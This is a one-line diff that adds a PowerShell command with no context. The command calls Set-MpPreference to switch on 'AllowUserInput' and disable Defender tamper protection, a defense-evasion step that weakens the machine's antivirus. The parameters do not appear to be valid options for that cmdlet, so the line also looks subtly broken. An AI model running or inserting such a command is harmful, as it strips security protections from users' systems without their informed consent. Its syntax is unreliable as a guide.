@@ -1,0 +1,1 @@
+powershell -Command "Set-MpPreference -AllowUserInput $true; Set-MpPreference -DisableTamperProtection $true"
